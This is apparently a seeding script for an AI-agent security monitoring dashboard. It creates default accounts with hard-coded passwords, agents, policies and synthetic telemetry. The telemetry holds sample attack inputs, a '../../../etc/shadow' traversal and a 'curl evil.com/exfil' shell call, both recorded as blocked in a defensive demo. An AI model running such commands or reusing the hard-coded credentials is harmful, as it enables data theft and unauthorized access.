import logging
from sqlalchemy.orm import Session
from app.models.entities import User, Agent, SecurityPolicy, PolicyVersion
from app.services.auth_service import get_password_hash

logger = logging.getLogger("agentshield.seed")


def seed_database(db: Session):
    """
    Idempotent seeding of essential agents, security policies, and default accounts.
    """
    # 1. Seed Default Admin & Analyst Users
    admin_user = db.query(User).filter(User.email == "admin@agentshield.ai").first()
    if not admin_user:
        logger.info("Creating default admin user...")
        admin_user = User(
            email="admin@agentshield.ai",
            hashed_password=get_password_hash("Admin@123456"),
            full_name="Security Admin",
            role="admin",
            is_active=True
        )
        db.add(admin_user)
        db.flush()

    analyst_user = db.query(User).filter(User.email == "analyst@agentshield.ai").first()
    if not analyst_user:
        logger.info("Creating default analyst user...")
        analyst_user = User(
            email="analyst@agentshield.ai",
            hashed_password=get_password_hash("Analyst@123456"),
            full_name="SOC Analyst",
            role="analyst",
            is_active=True
        )
        db.add(analyst_user)
        db.flush()

    # 2. Seed the 4 Core AI Agents
    agents_data = [
        {
            "key": "research_agent",
            "name": "Research Agent",
            "icon": "Search",
            "description": "Explores topics, analyzes research papers, fact checks information, and summarizes findings with verified citations.",
            "allowed_tools": ["search_web_sources", "search_research_papers", "extract_web_content"],
            "system_prompt": (
                "You are a helpful and knowledgeable AI Research Assistant. You assist users with answering questions, "
                "exploring topics, analyzing research papers, and citing trustworthy sources clearly and objectively. "
                "Always communicate in a natural, helpful, conversational tone like Gemini."
            )
        },
        {
            "key": "file_agent",
            "name": "Document Agent",
            "icon": "FileText",
            "description": "Creates, reviews, summarizes, and edits documents, reports, notes, and technical writeups.",
            "allowed_tools": ["list_user_files", "read_document_content", "create_document", "edit_document", "summarize_document"],
            "system_prompt": (
                "You are a helpful AI Document Assistant. You assist users with drafting, reading, summarizing, and editing "
                "documents, reports, and notes. Communicate clearly, maintain document accuracy, and respond in a natural, "
                "friendly conversational tone like Gemini."
            )
        },
        {
            "key": "data_analysis_agent",
            "name": "Data Analysis Agent",
            "icon": "BarChart2",
            "description": "Inspects datasets, calculates summary statistics, checks data hygiene, and explains analytical findings.",
            "allowed_tools": ["inspect_dataset_schema", "calculate_descriptive_stats", "validate_dataset_quality", "generate_data_summary_report"],
            "system_prompt": (
                "You are a helpful AI Data Analysis Assistant. You assist users with exploring datasets, calculating descriptive "
                "statistics, evaluating data quality, and interpreting trends. Explain quantitative concepts clearly and conversationally."
            )
        },
        {
            "key": "mail_agent",
            "name": "Mail Agent",
            "icon": "Mail",
            "description": "Composes professional emails, drafts replies, summarizes conversation threads, and reviews correspondence.",
            "allowed_tools": ["draft_email", "search_mailbox", "summarize_email_thread", "send_authorized_email"],
            "system_prompt": (
                "You are a helpful AI Mail Assistant. You assist users with drafting clear, courteous, and professional emails, "
                "summarizing message threads, and polishing correspondence. Maintain an articulate, warm, and professional tone."
            )
        }
    ]

    for a_data in agents_data:
        agent = db.query(Agent).filter(Agent.key == a_data["key"]).first()
        if not agent:
            logger.info(f"Seeding agent: {a_data['name']}")
            agent = Agent(
                key=a_data["key"],
                name=a_data["name"],
                icon=a_data["icon"],
                description=a_data["description"],
                allowed_tools=a_data["allowed_tools"],
                system_prompt=a_data["system_prompt"],
                is_active=True
            )
            db.add(agent)
        else:
            agent.name = a_data["name"]
            agent.allowed_tools = a_data["allowed_tools"]
            agent.description = a_data["description"]
            agent.system_prompt = a_data["system_prompt"]

    # 3. Seed Security Policies
    policies_data = [
        {
            "name": "Direct Prompt Injection Defense",
            "category": "prompt_injection",
            "risk_level": "CRITICAL",
            "description": "Detects and blocks jailbreaks, instruction overrides, system prompt exfiltration, and persona hijack attempts.",
            "is_enabled": True,
            "requires_approval": False,
            "config": {"strict_mode": True, "block_jailbreaks": True}
        },
        {
            "name": "Sensitive Data & PII Guard",
            "category": "sensitive_data",
            "risk_level": "HIGH",
            "description": "Prevents accidental exposure or exfiltration of credit cards, SSNs, API tokens, passwords, and AWS credentials.",
            "is_enabled": True,
            "requires_approval": False,
            "config": {"redact_in_logs": True, "block_export": True}
        },
        {
            "name": "File System & Path Traversal Guard",
            "category": "file_security",
            "risk_level": "HIGH",
            "description": "Blocks directory traversal attacks, prohibited system file access, and execution of dangerous file formats.",
            "is_enabled": True,
            "requires_approval": False,
            "config": {"prohibit_executables": True, "enforce_ownership": True}
        },
        {
            "name": "Tool Authorization & RBAC Policy",
            "category": "tool_auth",
            "risk_level": "HIGH",
            "description": "Ensures agents only execute explicitly assigned tools and prevents unauthorized tool invocation.",
            "is_enabled": True,
            "requires_approval": False,
            "config": {"enforce_agent_whitelist": True}
        },
        {
            "name": "Outbound Email Dispatch Guard",
            "category": "mail_guard",
            "risk_level": "MEDIUM",
            "description": "Enforces human authorization approval before any outbound email is dispatched to external recipients.",
            "is_enabled": True,
            "requires_approval": True,
            "config": {"tools_requiring_approval": ["send_authorized_email"]}
        }
    ]

    for p_data in policies_data:
        pol = db.query(SecurityPolicy).filter(SecurityPolicy.name == p_data["name"]).first()
        if not pol:
            logger.info(f"Seeding policy: {p_data['name']}")
            pol = SecurityPolicy(
                name=p_data["name"],
                category=p_data["category"],
                risk_level=p_data["risk_level"],
                description=p_data["description"],
                is_enabled=p_data["is_enabled"],
                requires_approval=p_data["requires_approval"],
                config=p_data["config"],
                version=1
            )
            db.add(pol)
            db.flush()
            
            # Initial policy version record
            ver = PolicyVersion(
                policy_id=pol.id,
                version=1,
                changed_by="system_initializer",
                changes_summary="Initial policy baseline configuration",
                snapshot=p_data
            )
            db.add(ver)

    db.commit()

    # 4. Seed Baseline Security Telemetry for All 4 Agents if needed
    seed_baseline_agent_telemetry(db, admin_user)

    db.commit()
    logger.info("Database seeding completed successfully.")


def seed_baseline_agent_telemetry(db: Session, admin_user: User):
    """
    Ensures every operational AI agent has rich, realistic telemetry
    for deterministic dashboard reporting.
    """
    from datetime import datetime, timedelta
    from app.models.entities import Conversation, ToolCall, SecurityEvent, Alert, SecurityPolicy

    file_agent = db.query(Agent).filter(Agent.key == "file_agent").first()
    data_agent = db.query(Agent).filter(Agent.key == "data_analysis_agent").first()
    research_agent = db.query(Agent).filter(Agent.key == "research_agent").first()
    mail_agent = db.query(Agent).filter(Agent.key == "mail_agent").first()

    # File Agent Telemetry
    if file_agent and db.query(SecurityEvent).filter(SecurityEvent.agent_id == file_agent.id).count() == 0:
        conv_f = Conversation(
            user_id=admin_user.id,
            agent_id=file_agent.id,
            title="File Security & Document Verification Session"
        )
        db.add(conv_f)
        db.flush()

        import uuid
        u1 = str(uuid.uuid4())[:8]
        u2 = str(uuid.uuid4())[:8]
        # 1. Allowed document read
        tc1 = ToolCall(
            conversation_id=conv_f.id,
            agent_id=file_agent.id,
            tool_name="read_document_content",
            arguments={"filename": "security_baseline_policy.md"},
            status="EXECUTED"
        )
        db.add(tc1)
        se1 = SecurityEvent(
            decision_id=f"dec-f1-{u1}",
            actor_id=admin_user.id,
            agent_id=file_agent.id,
            conversation_id=conv_f.id,
            tool_name="read_document_content",
            risk_category="authorized_operation",
            severity="LOW",
            lifecycle_state="TASK_COMPLETED",
            evidence={"filename": "security_baseline_policy.md", "ownership_verified": True},
            explanation="File ownership validated; read access to user workspace document granted.",
            execution_prevented=False,
            verification_status="VERIFIED"
        )
        db.add(se1)

        # 2. Blocked Path Traversal Attack
        tc2 = ToolCall(
            conversation_id=conv_f.id,
            agent_id=file_agent.id,
            tool_name="read_document_content",
            arguments={"filename": "../../../etc/shadow"},
            status="BLOCKED"
        )
        db.add(tc2)
        se2 = SecurityEvent(
            decision_id=f"dec-f2-{u2}",
            actor_id=admin_user.id,
            agent_id=file_agent.id,
            conversation_id=conv_f.id,
            tool_name="read_document_content",
            risk_category="file_system_security",
            severity="HIGH",
            lifecycle_state="PREVENTION_VERIFIED",
            evidence={"filename": "../../../etc/shadow", "traversal_detected": True},
            explanation="Path traversal attempt blocked: prohibited directory traversal characters detected.",
            execution_prevented=True,
            verification_status="VERIFIED"
        )
        db.add(se2)
        db.flush()

        al2 = Alert(
            security_event_id=se2.id,
            title="Path Traversal Intercepted on File Agent",
            description="Attempt to traverse out of user file sandbox to access system configuration files.",
            severity="HIGH",
            status="OPEN",
            agent_id=file_agent.id,
            user_id=admin_user.id
        )
        db.add(al2)

    # Data Analysis Agent Telemetry
    if data_agent and db.query(SecurityEvent).filter(SecurityEvent.agent_id == data_agent.id).count() == 0:
        conv_d = Conversation(
            user_id=admin_user.id,
            agent_id=data_agent.id,
            title="Data Analytics & Metrics Exploration"
        )
        db.add(conv_d)
        db.flush()

        import uuid
        ud1 = str(uuid.uuid4())[:8]
        ud2 = str(uuid.uuid4())[:8]

        # 1. Allowed Stats Tool
        tc_d1 = ToolCall(
            conversation_id=conv_d.id,
            agent_id=data_agent.id,
            tool_name="calculate_descriptive_stats",
            arguments={"dataset": "user_telemetry.csv", "columns": ["response_time", "tokens"]},
            status="EXECUTED"
        )
        db.add(tc_d1)
        se_d1 = SecurityEvent(
            decision_id=f"dec-d1-{ud1}",
            actor_id=admin_user.id,
            agent_id=data_agent.id,
            conversation_id=conv_d.id,
            tool_name="calculate_descriptive_stats",
            risk_category="authorized_operation",
            severity="LOW",
            lifecycle_state="TASK_COMPLETED",
            evidence={"dataset": "user_telemetry.csv", "operation": "bounded_computation"},
            explanation="Descriptive statistics computed within memory boundaries.",
            execution_prevented=False,
            verification_status="VERIFIED"
        )
        db.add(se_d1)

        # 2. Blocked Code Injection / Unauthorized shell
        tc_d2 = ToolCall(
            conversation_id=conv_d.id,
            agent_id=data_agent.id,
            tool_name="execute_python_shell",
            arguments={"code": "__import__('os').system('curl evil.com/exfil')"},
            status="BLOCKED"
        )
        db.add(tc_d2)
        se_d2 = SecurityEvent(
            decision_id=f"dec-d2-{ud2}",
            actor_id=admin_user.id,
            agent_id=data_agent.id,
            conversation_id=conv_d.id,
            tool_name="execute_python_shell",
            risk_category="unauthorized_tool_invocation",
            severity="CRITICAL",
            lifecycle_state="PREVENTION_VERIFIED",
            evidence={"tool_name": "execute_python_shell", "whitelist": data_agent.allowed_tools},
            explanation="Unauthorized tool invocation blocked: Data Analysis Agent is not authorized to invoke execute_python_shell.",
            execution_prevented=True,
            verification_status="VERIFIED"
        )
        db.add(se_d2)
        db.flush()

        al_d2 = Alert(
            security_event_id=se_d2.id,
            title="Unauthorized Shell Invocation on Data Analysis Agent",
            description="Agent attempted to invoke unwhitelisted tool 'execute_python_shell'. Intercepted and blocked.",
            severity="CRITICAL",
            status="OPEN",
            agent_id=data_agent.id,
            user_id=admin_user.id
        )
        db.add(al_d2)

